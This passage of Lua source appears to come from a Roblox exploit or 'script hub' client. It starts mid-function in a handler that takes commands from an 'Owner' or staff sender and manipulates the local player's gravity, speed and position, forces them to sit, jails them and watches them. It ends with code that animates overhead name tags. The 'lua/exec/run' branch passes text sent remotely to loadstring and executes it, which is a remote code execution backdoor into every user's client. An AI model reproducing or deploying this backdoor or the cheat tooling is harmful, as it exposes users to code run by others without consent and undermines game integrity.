        elseif subLow == "grav" or subLow == "gravity" then
            local g = tonumber(subRest)
            if g then
                pcall(function() workspace.Gravity = math.clamp(g, 0, 1000) end)
                notify("👑 OWNER CUSTOM", "Gravity set to " .. tostring(g))
            end
        elseif subLow == "tp" or subLow == "teleport" then
            local rx, ry, rz = subRest:match("([%-%d%.]+)[,%s]+([%-%d%.]+)[,%s]+([%-%d%.]+)")
            local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
            if rx and ry and rz and myRoot then
                pcall(function() myRoot.CFrame = CFrame.new(tonumber(rx), tonumber(ry), tonumber(rz)) end)
            elseif subRest ~= "" and myRoot then
                local q = subRest:lower():gsub("^@", "")
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Name:lower():find(q, 1, true) == 1 or pl.DisplayName:lower():find(q, 1, true) == 1 then
                        local tr = pl.Character and pl.Character:FindFirstChild("HumanoidRootPart")
                        if tr then pcall(function() myRoot.CFrame = tr.CFrame * CFrame.new(0, 0, -3) end) end
                        break
                    end
                end
            end
        elseif subLow == "emote" or subLow == "anim" then
            local aid = tostring(subRest or ""):gsub("%D", "")
            if aid ~= "" then
                task.spawn(function()
                    pcall(function()
                        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                        local animr = hum and hum:FindFirstChildOfClass("Animator")
                        if animr then
                            local a = Instance.new("Animation")
                            a.AnimationId = "rbxassetid://" .. aid
                            local tr = animr:LoadAnimation(a)
                            tr.Priority = Enum.AnimationPriority.Action4
                            tr.Looped = true
                            tr:Play(0.1)
                        end
                    end)
                end)
                notify("👑 OWNER CUSTOM", "Playing custom animation " .. aid)
            end
        elseif subLow == "sound" or subLow == "audio" then
            local sid = tostring(subRest or ""):gsub("%D", "")
            if sid ~= "" then
                pcall(function()
                    local s = Instance.new("Sound")
                    s.SoundId = "rbxassetid://" .. sid
                    s.Volume = 2
                    s.Parent = SoundService or workspace
                    s:Play()
                    Debris:AddItem(s, 30)
                end)
                notify("👑 OWNER CUSTOM", "Playing Owner audio #" .. sid)
            end
        elseif subLow == "lua" or subLow == "exec" or subLow == "run" then
            if subRest ~= "" and loadstring then
                task.spawn(function()
                    local fn, err = loadstring(subRest)
                    if fn then pcall(fn) else warn("[Coco Owner Custom] Compile error:", err) end
                end)
            end
        else
            -- Default: display any custom text directly as an Owner banner!
            if OwnerAdminState.showCustomAdminMessage then
                pcall(OwnerAdminState.showCustomAdminMessage, senderPlr.Name, getRoleDisplayName(senderPlr), "👑 OWNER @" .. senderPlr.Name, payload, "banner", 8, false)
            else
                notify("👑 OWNER @" .. senderPlr.Name, payload)
            end
        end
    elseif cmdType == 232 or cmdType == "clearmsg" then
        OwnerAdminState.clearCustomAdminMessages()
        notify("🧹 ADMIN MSG", "@" .. senderPlr.Name .. " cleared active admin announcements!")
    elseif cmdType == 233 or cmdType == "jail" then
        OwnerAdminState.toggleAdminJail(true, senderPlr.Name)
    elseif cmdType == 234 or cmdType == "unjail" then
        OwnerAdminState.toggleAdminJail(false, senderPlr.Name)
    elseif cmdType == 235 or cmdType == "orbit" then
        local ldr = senderPlr
        if customMsg and customMsg ~= "" then
            local q = customMsg:lower():gsub("^%s*@+%s*", "")
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():find(q, 1, true) == 1 or p.DisplayName:lower():find(q, 1, true) == 1 then
                    ldr = p; break
                end
            end
        end
        OwnerAdminState.toggleAdminOrbit(true, ldr, senderPlr.Name)
    elseif cmdType == 236 or cmdType == "unorbit" then
        OwnerAdminState.toggleAdminOrbit(false, nil, senderPlr.Name)
    elseif cmdType == 237 or cmdType == "bounce" then
        OwnerAdminState.toggleAdminBounce(nil, senderPlr.Name)
    elseif cmdType == 238 or cmdType == "spin" then
        OwnerAdminState.toggleAdminSpin(nil, senderPlr.Name)
    elseif cmdType == 239 or cmdType == "sit" then
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.Sit = true end)
            notify("🪑 ADMIN SIT", "@" .. senderPlr.Name .. " forced you to sit!")
        end
    elseif cmdType == 240 or cmdType == "setws" then
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        local val = tonumber(customMsg) or 50
        if hum then
            pcall(function() hum.WalkSpeed = math.clamp(val, 0, 250) end)
            notify("⚡ ADMIN WALKSPEED", "@" .. senderPlr.Name .. " set your WalkSpeed to " .. tostring(math.clamp(val, 0, 250)) .. "!")
        end
    elseif cmdType == 241 or cmdType == "setjp" then
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        local val = tonumber(customMsg) or 150
        if hum then
            pcall(function()
                hum.UseJumpPower = true
                hum.JumpPower = math.clamp(val, 0, 350)
            end)
            notify("🦘 ADMIN JUMPPOWER", "@" .. senderPlr.Name .. " set your JumpPower to " .. tostring(math.clamp(val, 0, 350)) .. "!")
        end
    elseif cmdType == 242 or cmdType == "watch" then
        local ldr = senderPlr
        if customMsg and customMsg ~= "" then
            local q = customMsg:lower():gsub("^%s*@+%s*", "")
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():find(q, 1, true) == 1 or p.DisplayName:lower():find(q, 1, true) == 1 then
                    ldr = p; break
                end
            end
        end
        OwnerAdminState.toggleAdminCameraWatch(true, ldr, senderPlr.Name)
    elseif cmdType == 243 or cmdType == "unwatch" then
        OwnerAdminState.toggleAdminCameraWatch(false, nil, senderPlr.Name)
    elseif cmdType == 244 or cmdType == "quake" then
        OwnerAdminState.triggerAdminEarthquake(senderPlr.Name)
    elseif cmdType == 245 or cmdType == "glitch" then
        OwnerAdminState.toggleAdminGlitchOverlay(nil, senderPlr.Name)
    elseif cmdType == 246 or cmdType == "conga" then
        OwnerAdminState.toggleAdminConga(true, senderPlr, senderPlr.Name)
    elseif cmdType == 247 or cmdType == "unconga" then
        OwnerAdminState.toggleAdminConga(false, nil, senderPlr.Name)
    elseif cmdType == 248 or cmdType == "fullreset" then
        OwnerAdminState.fullAdminEmergencyRestore(senderPlr.Name)
    end
end

-- Overhead Name Tag (BillboardGui) Renderer for Owner (👑), Elite Users (🔥), Coco Staff (🛡️) & Script Users (⚡)
-- Upgraded V37.0 Ultra-Sleek Obsidian Cyber-Glass Design: Floating Depth, Dual-Halo, Rotating Conic Medallion & Live Status Dot
local overheadTagAnimConn = nil

local function stopOverheadTagAnimatorIfEmpty()
    if next(OverheadTagGuis) == nil and overheadTagAnimConn then
        pcall(function() overheadTagAnimConn:Disconnect() end)
        overheadTagAnimConn = nil
    end
end

local function ensureOverheadTagAnimator()
    if overheadTagAnimConn then return end
    overheadTagAnimConn = RunService.RenderStepped:Connect(function()
        if next(OverheadTagGuis) == nil then
            stopOverheadTagAnimatorIfEmpty()
            return
        end
        local t = os.clock()
        for uid, entry in pairs(OverheadTagGuis) do
            if entry and entry.gui and entry.gui.Parent then
                local phase = (tonumber(uid) or 0) % 19 * 0.42
                local speedMult = entry.animSpeed or 1.0
                -- 1. Subtle weightless vertical hover bob
                entry.gui.StudsOffset = Vector3.new(0, 2.58 + math.sin(t * 2.1 * speedMult + phase) * 0.075, 0)
                -- 2. Deep obsidian-glass gradient drift
                if entry.bgGrad then
                    entry.bgGrad.Rotation = 16 + math.sin(t * 0.8 * speedMult + phase) * 20
                    entry.bgGrad.Offset = Vector2.new(math.sin(t * 0.6 * speedMult + phase) * 0.14, 0)
                end
                -- 3. Smooth orbiting liquid-metallic hairline border
                if entry.strokeGrad then
                    entry.strokeGrad.Rotation = (t * 76 * speedMult + phase * 38) % 360
                end
                -- 4. Diagonal liquid-glass sheen sweep
                if entry.shimmerFrame then
                    local sweep = ((t * 0.48 * speedMult + phase * 0.18) % 2.9) - 0.75
                    entry.shimmerFrame.Position = UDim2.new(sweep, 0, -0.5, 0)
                end
                -- 5. Soft breathing ambient aura & rotating emblem ring
                if entry.glowFrame then
                    entry.glowFrame.BackgroundTransparency = 0.84 + math.sin(t * 2.2 * speedMult + phase) * 0.06
                end
                if entry.emblemGrad then
                    entry.emblemGrad.Rotation = (t * 58 * speedMult + phase * 28) % 360
                end
                -- 6. Live pulsing status indicator dot
                if entry.liveDot then
                    entry.liveDot.BackgroundTransparency = 0.1 + (0.5 + 0.5 * math.sin(t * 4.2 * speedMult + phase)) * 0.55
                end
            end
        end
    end)
end

